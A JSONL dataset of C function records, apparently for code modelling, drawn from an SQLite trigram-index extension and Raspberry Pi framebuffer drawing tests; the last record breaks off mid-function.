{"docstring": "/** Get the next result id\n * Returns true, if *pId is a result, sets ppExpr NULL there's nothing more */\n", "func_signal": "bool exprNextResult(expr **ppExpr, sqlite3_int64 *pId)", "code": "{\n  while(*ppExpr){\n    *pId = exprNextCandidate(*ppExpr);\n    if(exprCheckAndMove(ppExpr, *pId))\n      return true;\n  }\n  assert(!*ppExpr);\n  return false;\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Find doclist for trigram in hash table \n * Returns pointer to doclist, NULL if not found.\n * Number of entries in doclist is output as *pnDocList (0 if doclist == NULL).\n */\n", "func_signal": "sqlite3_int64* hashFind(hash_table *pTable, trilite_trigram trigram, int *pnDocList)", "code": "{\n  hash_entry *pEntry;\n  hash_entry *pPrevEntry;\n  if(findEntry(pTable, trigram, &pEntry, &pPrevEntry)){\n    *pnDocList = pEntry->nDocList;\n    return DOCLIST(pEntry);\n  }\n  *pnDocList = 0;\n  return NULL;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Read integer in varint encoding from pBuf, return it as *out\n * Returns number of bytes read.\n */\n", "func_signal": "int readVarInt(unsigned char *pBuf, sqlite3_int64 *out)", "code": "{\n  /* Yes, it's ugly to unroll a loop manually, I didn't test to see if it's */\n  /* faster, it was just easier to write it this way without having unecessary */\n  /* checks all over the place. Also I don't see any reason to waste time */\n  /* designing a smart loop, when this works, and probably is faster :) */\n  *out = 0;\n  /* Read byte 0 */\n  *out |= (sqlite3_int64)(pBuf[0] & ~VARINT_END_BITMASK);\n  if(pBuf[0] & VARINT_END_BITMASK) return 1;\n  /* Read byte 1 */\n  *out |= ((sqlite3_int64)(pBuf[1] & ~VARINT_END_BITMASK)) << 7;\n  if(pBuf[1] & VARINT_END_BITMASK) return 2;\n  /* Read byte 2 */\n  *out |= ((sqlite3_int64)(pBuf[2] & ~VARINT_END_BITMASK)) << (7 * 2);\n  if(pBuf[2] & VARINT_END_BITMASK) return 3;\n  /* Read byte 3 */\n  *out |= ((sqlite3_int64)(pBuf[3] & ~VARINT_END_BITMASK)) << (7 * 3);\n  if(pBuf[3] & VARINT_END_BITMASK) return 4;\n  /* Read byte 4 */\n  *out |= ((sqlite3_int64)(pBuf[4] & ~VARINT_END_BITMASK)) << (7 * 4);\n  if(pBuf[4] & VARINT_END_BITMASK) return 5;\n  /* Read byte 5 */\n  *out |= ((sqlite3_int64)(pBuf[5] & ~VARINT_END_BITMASK)) << (7 * 5);\n  if(pBuf[5] & VARINT_END_BITMASK) return 6;\n  /* Read byte 6 */\n  *out |= ((sqlite3_int64)(pBuf[6] & ~VARINT_END_BITMASK)) << (7 * 6);\n  if(pBuf[6] & VARINT_END_BITMASK) return 7;\n  /* Read byte 7 */\n  *out |= ((sqlite3_int64)(pBuf[7] & ~VARINT_END_BITMASK)) << (7 * 7);\n  if(pBuf[7] & VARINT_END_BITMASK) return 8;\n  /* Read byte 8 (starting from 0) */\n  *out |= ((sqlite3_int64)pBuf[8]) << (7 * 8);\n  return 9;\n}", "path": "varint.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Remove id from trigram, if present */\n", "func_signal": "bool hashRemove(hash_table *pTable, trilite_trigram trigram, sqlite3_int64 id)", "code": "{\n  assert(false);\n  return false;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Parse expression, load doclists and output it to ppExpr */\n", "func_signal": "int exprParse(expr **ppExpr, bool *pAll, trilite_vtab *pTrgVtab, const unsigned char *pattern, int nPattern)", "code": "{\n  if(strncmp((const char*)pattern, \"substr:\", 7) == 0){\n    if(nPattern == 7){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return exprSubstring(ppExpr, pAll, pTrgVtab, pattern + 7, nPattern - 7);\n  }else if(strncmp((const char*)pattern, \"isubstr:\", 8) == 0){\n    if(nPattern == 8){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return exprSubstring(ppExpr, pAll, pTrgVtab, pattern + 8, nPattern - 8);\n  }else if(strncmp((const char*)pattern, \"substr-extents:\", 15) == 0){\n    if(nPattern == 15){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return exprSubstring(ppExpr, pAll, pTrgVtab, pattern + 15, nPattern - 15);\n  }else if(strncmp((const char*)pattern, \"isubstr-extents:\", 16) == 0){\n    if(nPattern == 16){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return exprSubstring(ppExpr, pAll, pTrgVtab, pattern + 16, nPattern - 16);\n  }else if(strncmp((const char*)pattern, \"regexp:\", 7) == 0){\n    if(nPattern == 7){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return regexpPreFilter(ppExpr, pAll, pTrgVtab, pattern + 7, nPattern - 7);\n  }else if(strncmp((const char*)pattern, \"regexp-extents:\", 15) == 0){\n    if(nPattern == 15){\n      triliteError(pTrgVtab, \"Empty patterned in MATCH not allowed!\");\n      return SQLITE_ERROR;\n    }\n    return regexpPreFilter(ppExpr, pAll, pTrgVtab, pattern + 15, nPattern - 15);\n  }else{\n    triliteError(pTrgVtab, \"MATCH pattern must be a regular expression or a substring pattern!\");\n    return SQLITE_ERROR;\n  }\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Create a trigram expression for matching against a single trigram */\n", "func_signal": "int exprTrigram(expr **ppExpr, trilite_vtab *pTrgVtab, trilite_trigram trigram)", "code": "{\n  int rc = SQLITE_OK;\n\n  sqlite3_blob *pBlob;\n  char *zTable = sqlite3_mprintf(\"%s_index\", pTrgVtab->zName);\n  /* Open the blob */\n  rc = sqlite3_blob_open(pTrgVtab->db, pTrgVtab->zDb, zTable, \"doclist\", trigram, 0, &pBlob);\n  sqlite3_free(zTable);\n\n  /* If we didn't get a blob */\n  if(rc != SQLITE_OK){\n    *ppExpr = NULL;\n    return SQLITE_OK;\n  }\n  /* Get size of blob */\n  int nSize = sqlite3_blob_bytes(pBlob);\n\n  /* Allocate space for expr and doclist at the same time */\n  *ppExpr = (expr*)sqlite3_malloc(sizeof(expr) + nSize);\n\n  /* Set the expr */\n  (*ppExpr)->eType                 = EXPR_TRIGRAM;\n  (*ppExpr)->expr.trigram.docList  = ((unsigned char*)(*ppExpr)) + sizeof(expr);\n  (*ppExpr)->expr.trigram.nSize    = nSize;\n\n  /* Read doclist into memory */\n  sqlite3_blob_read(pBlob, (*ppExpr)->expr.trigram.docList, nSize, 0);\n\n  /* Release blob */\n  sqlite3_blob_close(pBlob);\n\n  /* Read first id */\n  int read = readVarInt((*ppExpr)->expr.trigram.docList, &(*ppExpr)->expr.trigram.curId);\n  (*ppExpr)->expr.trigram.curId   += DELTA_LIST_OFFSET;\n  (*ppExpr)->expr.trigram.nSize   -= read;\n  (*ppExpr)->expr.trigram.docList += read;\n\n  return rc;\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Insert document id in hash */\n", "func_signal": "bool hashInsert(hash_table *pTable, trilite_trigram trigram, sqlite3_int64 id)", "code": "{\n  hash_entry *pEntry;\n  hash_entry *pPrevEntry;\n  if(findEntry(pTable, trigram, &pEntry, &pPrevEntry)){\n    /* If there's no slots available, we have to reallocate and update next pointer on pPrevEntry */\n    if(!pEntry->nSizeAvail){\n      assert(ALLOCATION_FACTOR >= 1);\n      int slots = pEntry->nDocList * ALLOCATION_FACTOR + 1;\n      pEntry = (hash_entry*)sqlite3_realloc(pEntry, sizeof(hash_entry) + sizeof(sqlite3_int64) * slots);\n      pEntry->nSizeAvail = slots - pEntry->nDocList;\n      pTable->memory += pEntry->nSizeAvail * sizeof(sqlite3_int64);\n    }\n  }else{\n    /* If there was not entry for this trigram let's allocate one */\n    pEntry = (hash_entry*)sqlite3_malloc(sizeof(hash_entry) + sizeof(sqlite_int64) * MIN_ALLOCATION);\n    pEntry->nDocList    = 0;\n    pEntry->nSizeAvail  = MIN_ALLOCATION;\n    pEntry->next        = NULL;\n    pEntry->trigram     = trigram;\n    pTable->memory += sizeof(hash_entry) + sizeof(sqlite_int64) * MIN_ALLOCATION;\n  }\n  /* Create/Update references */\n  if(pPrevEntry)\n    pPrevEntry->next = pEntry;\n  else\n    pTable->keys[COMPUTE_HASH(trigram)] = pEntry;\n  \n  /* Insert id into docList, move ids as necessary */\n  int i;\n  /* TODO A cute little binary search might be nice */\n  sqlite3_int64 *docList = DOCLIST(pEntry);\n  for(i = 0; i < pEntry->nDocList; i++)\n    if(docList[i] >= id) break;\n  /* Return false, if id was already here */\n  if(i < pEntry->nDocList && docList[i] == id) return false;\n  /* Move all ids > id */\n  memmove(docList + i + 1, docList + i, (pEntry->nDocList - i) * sizeof(sqlite3_int64));\n  /* Insert id */\n  docList[i] = id;\n\n  /* Update available size */\n  pEntry->nDocList += 1;\n  pEntry->nSizeAvail -= 1;\n  \n  return true;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Create an expression for matching substrings */\n", "func_signal": "int exprSubstring(expr **ppExpr, bool *pAll, trilite_vtab *pTrgVtab, const unsigned char *string, int nString)", "code": "{\n  int rc = SQLITE_OK;\n  *ppExpr = NULL;\n\n  /* There should be trigrams here, these special cases should be handled elsewhere */\n  if(nString < 3){\n    *pAll = true;\n    return SQLITE_OK;\n  }\n\n  int i;\n  for(i = 0; i < nString - 2; i++){\n    trilite_trigram trigram = HASH_TRIGRAM(string + i);\n    /* Get a trigram expression for the trigram */\n    expr *pTrgExpr;\n    rc = exprTrigram(&pTrgExpr, pTrgVtab, trigram);\n    /* If there's no trigramExpr that satisfy our conditions */\n    /* we're done here as the substring can't be matched! */\n    if(!pTrgExpr){\n      exprRelease(*ppExpr);\n      *pAll = false;\n      *ppExpr = NULL; /* Can't satisfy this tree */\n      return rc;\n    }\n\n    /* Combine with an AND expression */\n    if(*ppExpr){\n      rc = exprOperator(ppExpr, *ppExpr, pTrgExpr, EXPR_AND);\n      assert(rc == SQLITE_OK);\n    }else\n      *ppExpr = pTrgExpr;\n  }\n\n  return rc;\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Next candidate id */\n", "func_signal": "static sqlite3_int64 exprNextCandidate(expr *pExpr)", "code": "{\n  assert(pExpr);\n  if(pExpr->eType & EXPR_OP){\n    sqlite3_int64 v1 = exprNextCandidate(pExpr->expr.op.expr1);\n    sqlite3_int64 v2 = exprNextCandidate(pExpr->expr.op.expr2);\n    if(pExpr->eType == EXPR_AND)\n      return MAX(v1, v2);\n    assert(pExpr->eType == EXPR_OR);\n    return MIN(v1, v2);\n  }else{\n    assert(pExpr->eType == EXPR_TRIGRAM);\n    return pExpr->expr.trigram.curId;\n  }\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Create an operator expression */\n", "func_signal": "int exprOperator(expr** ppExpr, expr* pExpr1, expr* pExpr2, expr_type eType)", "code": "{\n  assert(eType & EXPR_OP);\n  *ppExpr = (expr*)sqlite3_malloc(sizeof(expr));\n  if(!*ppExpr) return SQLITE_NOMEM;\n  (*ppExpr)->eType = eType;\n  (*ppExpr)->expr.op.expr1 = pExpr1;\n  (*ppExpr)->expr.op.expr2 = pExpr2;\n  return SQLITE_OK;\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "// helper function to draw a rectangle in given color\n", "func_signal": "void fill_rect(int x, int y, int w, int h, int c)", "code": "{\n    int cx, cy;\n    for (cy = 0; cy < h; cy++) {\n        for (cx = 0; cx < w; cx++) {\n            put_pixel(x + cx, y + cy, c);\n        }\n    }\n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to set the framebuffer virtual offset == pan\n", "func_signal": "static unsigned set_fb_voffs(unsigned *x, unsigned *y)", "code": "{\n   int i=0;\n   unsigned p[32];\n   p[i++] = 0; // size\n   p[i++] = 0x00000000; // process request\n\n   p[i++] = 0x00048009; // get physical (display) width/height\n   p[i++] = 0x00000008; // buffer size\n   p[i++] = 0x00000000; // request size\n   p[i++] = *x; // value buffer\n   p[i++] = *y; // value buffer 2\n\n   p[i++] = 0x00000000; // end tag\n   p[0] = i*sizeof *p; // actual size\n\n   mbox_property(p);\n   *x = p[5];\n   *y = p[6];\n   return p[1];\n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to talk to the mailbox interface\n", "func_signal": "static int mbox_property(void *buf)", "code": "{\n   if (mboxfd < -1) return -1;\n   \n   int ret_val = ioctl(mboxfd, IOCTL_MBOX_PROPERTY, buf);\n\n   if (ret_val < 0) {\n      printf(\"ioctl_set_msg failed:%d\\n\", ret_val);\n   }\n\n   return ret_val;\n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to 'plot' a pixel in given color\n", "func_signal": "void put_pixel(int x, int y, int c)", "code": "{\n    // calculate the pixel's byte offset inside the buffer\n    unsigned int pix_offset = x + y * finfo.line_length;\n\n    // now this is about the same as 'fbp[pix_offset] = value'\n    *((char*)(fbp + pix_offset)) = c;\n\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a rectangle outline in given color\n", "func_signal": "void draw_rect(int x0, int y0, int w, int h, int c)", "code": "{\n    draw_line(x0, y0, x0 + w, y0, c); // top\n    draw_line(x0, y0, x0, y0 + h, c); // left\n    draw_line(x0, y0 + h, x0 + w, y0 + h, c); // bottom\n    draw_line(x0 + w, y0, x0 + w, y0 + h, c); // right\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to 'plot' a pixel in given color\n", "func_signal": "void put_pixel(int x, int y, int c)", "code": "{\n    // calculate the pixel's byte offset inside the buffer\n    unsigned int pix_offset = x + y * finfo.line_length;\n\n    // now this is about the same as 'fbp[pix_offset] = value'\n    *((char*)(fbp + pix_offset)) = c;\n\n}", "path": "fb\\fbtestX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a rectangle in given color\n", "func_signal": "void fill_rect(int x, int y, int w, int h, int c)", "code": "{\n    int cx, cy;\n    for (cy = 0; cy < h; cy++) {\n        for (cx = 0; cx < w; cx++) {\n            put_pixel(x + cx, y + cy, c);\n        }\n    }\n}", "path": "fb\\fbtestXI.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a rectangle outline in given color\n", "func_signal": "void fill_rect(int x0, int y0, int w, int h, int c)", "code": "{\n    int y;\n    for (y = 0; y < h; y++) {\n        draw_line(x0, y0 + y, x0 + w, y0 + y, c);\n    }\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a filled circle in given color\n// (uses Bresenham's circle algorithm)\n", "func_signal": "void fill_circle(int x0, int y0, int r, int c)", "code": "{\n    int x = r;\n    int y = 0;\n    int radiusError = 1 - x;\n\n    while(x >= y)\n    {\n        // top\n        draw_line(-y + x0, -x + y0, y + x0, -x + y0, c);\n        // upper middle\n        draw_line(-x + x0, -y + y0, x + x0, -y + y0, c);\n        // lower middle\n        draw_line(-x + x0, y + y0, x + x0, y + y0, c);\n        // bottom \n        draw_line(-y + x0, x + y0, y + x0, x + y0, c);\n\n        y++;\n        if (radiusError < 0)\n        {\n            radiusError += 2 * y + 1;\n        } else {\n            x--;\n            radiusError+= 2 * (y - x + 1);\n        }\n    }\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function for drawing - no more need to go mess with\n// the main function when just want to change what to draw...\n", "func_signal": "void draw()", "code": "{\n\n    int i, x, y, w, h, dx, dy;\n\n    // start position (upper left)\n    x = 0;\n    y = 0;\n    // rectangle dimensions\n    w = vinfo.yres / 10;\n    h = w;\n    // move step 'size'\n    dx = 1;\n    dy = 1;\n\n    int fps = 100;\n    int secs = 10;\n    \n    // loop for a while\n    for (i = 0; i < (fps * secs); i++) {\n\n        // clear the previous image (= fill entire screen)\n        clear_screen(8);\n        \n        // draw the bouncing rectangle\n        fill_rect(x, y, w, h, 15);\n\n        // move the rectangle\n        x = x + dx;\n        y = y + dy;\n\n        // check for display sides\n        if ((x < 0) || (x > (vinfo.xres - w))) {\n            dx = -dx; // reverse direction\n            x = x + 2 * dx; // counteract the move already done above\n        }\n        // same for vertical dir\n        if ((y < 0) || (y > (vinfo.yres - h))) {\n            dy = -dy;\n            y = y + 2 * dy;\n        }\n        \n        usleep(1000000 / fps); // to be exact, would need to time the above and subtract...\n    }\n\n}", "path": "fb\\fbtestX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a circle outline in given color\n// (uses Bresenham's circle algorithm)\n", "func_signal": "void draw_circle(int x0, int y0, int r, int c)", "code": "{\n    int x = r;\n    int y = 0;\n    int radiusError = 1 - x;\n\n    while(x >= y)\n    {\n        // top left\n        put_pixel(-y + x0, -x + y0, c);\n        // top right\n        put_pixel(y + x0, -x + y0, c);\n        // upper middle left\n        put_pixel(-x + x0, -y + y0, c);\n        // upper middle right\n        put_pixel(x + x0, -y + y0, c);\n        // lower middle left\n        put_pixel(-x + x0, y + y0, c);\n        // lower middle right\n        put_pixel(x + x0, y + y0, c);\n        // bottom left\n        put_pixel(-y + x0, x + y0, c);\n        // bottom right\n        put_pixel(y + x0, x + y0, c);\n\n        y++;\n        if (radiusError < 0)\n        {\n            radiusError += 2 * y + 1;\n        } else {\n            x--;\n            radiusError+= 2 * (y - x + 1);\n        }\n    }\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to 'plot' a pixel in given color\n", "func_signal": "void put_pixel(int x, int y, int c)", "code": "{\n    // calculate the pixel's byte offset inside the buffer\n    unsigned int pix_offset = x + y * finfo.line_length;\n\n    // offset by the current buffer start\n    pix_offset += cur_page * page_size;\n    \n    // now this is about the same as 'fbp[pix_offset] = value'\n    *((char*)(fbp + pix_offset)) = c;\n\n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function for drawing - no more need to go mess with\n// the main function when just want to change what to draw...\n", "func_signal": "void draw()", "code": "{\n\n    int x;\n    \n    // some pixels\n    for (x = 0; x < vinfo.xres; x+=5) {\n        put_pixel(x, vinfo.yres / 2, WHITE);\n    }\n\n    // some lines (note the quite likely 'Moire pattern')\n    for (x = 0; x < vinfo.xres; x+=20) {\n        draw_line(0, 0, x, vinfo.yres - 1, GREEN);\n    }\n    \n    // some rectangles\n    draw_rect(vinfo.xres / 4, vinfo.yres / 2 + 10, vinfo.xres / 4, vinfo.yres / 4, PURPLE);    \n    draw_rect(vinfo.xres / 4 + 10, vinfo.yres / 2 + 20, vinfo.xres / 4 - 20, vinfo.yres / 4 - 20, PURPLE);    \n    fill_rect(vinfo.xres / 4 + 20, vinfo.yres / 2 + 30, vinfo.xres / 4 - 40, vinfo.yres / 4 - 40, YELLOW);    \n\n    // some circles\n    int d;\n    for(d = 10; d < vinfo.yres / 6; d+=10) {\n        draw_circle(3 * vinfo.xres / 4, vinfo.yres / 4, d, RED);\n    }\n    \n    fill_circle(3 * vinfo.xres / 4, 3 * vinfo.yres / 4, vinfo.yres / 6, ORANGE);\n    fill_circle(3 * vinfo.xres / 4, 3 * vinfo.yres / 4, vinfo.yres / 8, RED);\n\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// application entry point\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n\n    struct fb_var_screeninfo orig_vinfo;\n    long int screensize = 0;\n\n\n    // Open the file for reading and writing\n    fbfd = open(\"/dev/fb0\", O_RDWR);\n    if (fbfd == -1) {\n      printf(\"Error: cannot open framebuffer device.\\n\");\n      return(1);\n    }\n    printf(\"The framebuffer device was opened successfully.\\n\");\n\n    // Get variable screen information\n    if (ioctl(fbfd, FBIOGET_VSCREENINFO, &vinfo)) {\n      printf(\"Error reading variable information.\\n\");\n    }\n    printf(\"Original %dx%d, %dbpp\\n\", vinfo.xres, vinfo.yres, \n       vinfo.bits_per_pixel );\n\n    // Store for reset (copy vinfo to vinfo_orig)\n    memcpy(&orig_vinfo, &vinfo, sizeof(struct fb_var_screeninfo));\n\n    // Change variable info\n    vinfo.bits_per_pixel = 8;\n    vinfo.xres = 480;\n    vinfo.yres = 270;\n    vinfo.xres_virtual = vinfo.xres;\n    vinfo.yres_virtual = vinfo.yres * 2;\n    if (ioctl(fbfd, FBIOPUT_VSCREENINFO, &vinfo)) {\n      printf(\"Error setting variable information.\\n\");\n    }\n\n    // Get fixed screen information\n    if (ioctl(fbfd, FBIOGET_FSCREENINFO, &finfo)) {\n      printf(\"Error reading fixed information.\\n\");\n    }\n    //printf(\"Fixed info: smem_len %d, line_length %d\\n\", finfo.smem_len, finfo.line_length);\n    \n    page_size = finfo.line_length * vinfo.yres;\n\n    // map fb to user mem \n    screensize = finfo.smem_len;\n    fbp = (char*)mmap(0, \n              screensize, \n              PROT_READ | PROT_WRITE, \n              MAP_SHARED, \n              fbfd, \n              0);\n\n    if ((int)fbp == -1) {\n        printf(\"Failed to mmap.\\n\");\n    }\n    else {\n        // draw...\n        draw();\n        //sleep(5);\n    }\n\n    // cleanup\n    // unmap fb file from memory\n    munmap(fbp, screensize);\n    // reset the display mode\n    if (ioctl(fbfd, FBIOPUT_VSCREENINFO, &orig_vinfo)) {\n        printf(\"Error re-setting variable information.\\n\");\n    }\n    // close fb file    \n    close(fbfd);\n\n    return 0;\n  \n}", "path": "fb\\fbtestXI.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function for drawing - no more need to go mess with\n// the main function when just want to change what to draw...\n", "func_signal": "void draw()", "code": "{\n\n    int i, x, y, w, h, dx, dy;\n    struct timespec pt;\n    struct timespec ct;\n    struct timespec df;\n\n    // rectangle dimensions\n    w = vinfo.yres / 10;\n    h = w;\n\n    // start position (upper left)\n    x = 0;\n    y = 0;\n    int n;\n    for (n = 0; n < NUM_ELEMS; n++) {\n        int ex = rand() % (vinfo.xres - w); \n        int ey = rand() % (vinfo.yres - h);\n        //printf(\"%d: %d,%d\\n\", n, ex, ey);\n        xs[n] = ex;\n        ys[n] = ey;\n        int edx = (rand() % 10) + 1; \n        int edy = (rand() % 10) + 1;\n        dxs[n] = edx;\n        dys[n] = edy;\n    }\n\n    // move step 'size'\n    dx = 1;\n    dy = 1;\n\n    int fps = 60;\n    int secs = 10;\n    \n    int vx, vy;\n\n    clock_gettime(CLOCK_REALTIME, &pt);\n    \n    // loop for a while\n    for (i = 0; i < (fps * secs); i++) {\n\n        // change page to draw to (between 0 and 1)\n        cur_page = (cur_page + 1) % 2;\n    \n        // clear the previous image (= fill entire screen)\n        clear_screen(0);\n        \n        for (n = 0; n < NUM_ELEMS; n++) {\n            x = xs[n];\n            y = ys[n];\n            dx = dxs[n];\n            dy = dys[n];\n            \n            // draw the bouncing rectangle\n            fill_rect(x, y, w, h, (n % 15) + 1);\n\n            // move the rectangle\n            x = x + dx;\n            y = y + dy;\n\n            // check for display sides\n            if ((x < 0) || (x > (vinfo.xres - w))) {\n                dx = -dx; // reverse direction\n                x = x + 2 * dx; // counteract the move already done above\n            }\n            // same for vertical dir\n            if ((y < 0) || (y > (vinfo.yres - h))) {\n                dy = -dy;\n                y = y + 2 * dy;\n            }\n\n            xs[n] = x;\n            ys[n] = y;\n            dxs[n] = dx;\n            dys[n] = dy;\n        }\n        \n        // switch page\n        /*\n        vinfo.yoffset = cur_page * vinfo.yres;\n        vinfo.activate = FB_ACTIVATE_VBL;\n        if (ioctl(fbfd, FBIOPAN_DISPLAY, &vinfo)) {\n            printf(\"Error panning display.\\n\");\n        }\n        */\n        vx = 0;\n        vy = cur_page * vinfo.yres;\n        set_fb_voffs(&vx, &vy);\n        \n        //usleep(1000000 / fps);\n    }\n\n    clock_gettime(CLOCK_REALTIME, &ct);\n    df = timediff(pt, ct);\n    printf(\"done in %ld s %5ld ms\\n\", df.tv_sec, df.tv_nsec / 1000000);\n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a rectangle in given color\n", "func_signal": "void fill_rect(int x, int y, int w, int h, int c)", "code": "{\n    int cx, cy;\n    for (cy = 0; cy < h; cy++) {\n        for (cx = 0; cx < w; cx++) {\n            put_pixel(x + cx, y + cy, c);\n        }\n    }\n}", "path": "fb\\fbtestX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function for drawing - no more need to go mess with\n// the main function when just want to change what to draw...\n", "func_signal": "void draw()", "code": "{\n\n    int i, x, y, w, h, dx, dy;\n\n    // start position (upper left)\n    x = 0;\n    y = 0;\n    // rectangle dimensions\n    w = vinfo.yres / 10;\n    h = w;\n    // move step 'size'\n    dx = 1;\n    dy = 1;\n\n    int fps = 100;\n    int secs = 10;\n    \n    // loop for a while\n    for (i = 0; i < (fps * secs); i++) {\n\n        // change page to draw to (between 0 and 1)\n        cur_page = (cur_page + 1) % 2;\n    \n        // clear the previous image (= fill entire screen)\n        clear_screen(8);\n        \n        // draw the bouncing rectangle\n        fill_rect(x, y, w, h, 15);\n\n        // move the rectangle\n        x = x + dx;\n        y = y + dy;\n\n        // check for display sides\n        if ((x < 0) || (x > (vinfo.xres - w))) {\n            dx = -dx; // reverse direction\n            x = x + 2 * dx; // counteract the move already done above\n        }\n        // same for vertical dir\n        if ((y < 0) || (y > (vinfo.yres - h))) {\n            dy = -dy;\n            y = y + 2 * dy;\n        }\n        \n        // switch page\n        vinfo.yoffset = cur_page * vinfo.yres;\n        vinfo.activate = FB_ACTIVATE_VBL;\n        if (ioctl(fbfd, FBIOPAN_DISPLAY, &vinfo)) {\n            printf(\"Error panning display.\\n\");\n        }\n        \n        usleep(1000000 / fps);\n    }\n\n}", "path": "fb\\fbtestXI.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to 'plot' a pixel in given color\n", "func_signal": "void put_pixel(int x, int y, int c)", "code": "{\n    // calculate the pixel's byte offset inside the buffer\n    unsigned int pix_offset = x + y * finfo.line_length;\n\n    // offset by the current buffer start\n    pix_offset += cur_page * page_size;\n    \n    // now this is about the same as 'fbp[pix_offset] = value'\n    *((char*)(fbp + pix_offset)) = c;\n\n}", "path": "fb\\fbtestXI.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// application entry point\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n\n    struct fb_var_screeninfo orig_vinfo;\n    long int screensize = 0;\n\n    // Open the framebuffer file for reading and writing\n    fbfd = open(\"/dev/fb0\", O_RDWR);\n    if (fbfd == -1) {\n      printf(\"Error: cannot open framebuffer device.\\n\");\n      return(1);\n    }\n    printf(\"The framebuffer device was opened successfully.\\n\");\n\n    // hide cursor\n    char *kbfds = \"/dev/tty\";\n    int kbfd = open(kbfds, O_WRONLY);\n    if (kbfd >= 0) {\n        ioctl(kbfd, KDSETMODE, KD_GRAPHICS);\n    }\n    else {\n        printf(\"Could not open %s.\\n\", kbfds);\n    }\n\n    // Get variable screen information\n    if (ioctl(fbfd, FBIOGET_VSCREENINFO, &vinfo)) {\n      printf(\"Error reading variable information.\\n\");\n    }\n    printf(\"Original %dx%d, %dbpp\\n\", vinfo.xres, vinfo.yres, \n       vinfo.bits_per_pixel );\n\n    // Store for reset (copy vinfo to vinfo_orig)\n    memcpy(&orig_vinfo, &vinfo, sizeof(struct fb_var_screeninfo));\n\n    // Change variable info\n    vinfo.bits_per_pixel = 8;\n    vinfo.xres = 960;\n    vinfo.yres = 540;\n    vinfo.xres_virtual = vinfo.xres;\n    vinfo.yres_virtual = vinfo.yres * 2;\n    if (ioctl(fbfd, FBIOPUT_VSCREENINFO, &vinfo)) {\n      printf(\"Error setting variable information.\\n\");\n    }\n\n    // Get fixed screen information\n    if (ioctl(fbfd, FBIOGET_FSCREENINFO, &finfo)) {\n      printf(\"Error reading fixed information.\\n\");\n    }\n    //printf(\"Fixed info: smem_len %d, line_length %d\\n\", finfo.smem_len, finfo.line_length);\n    \n    page_size = finfo.line_length * vinfo.yres;\n\n    // map fb to user mem \n    screensize = 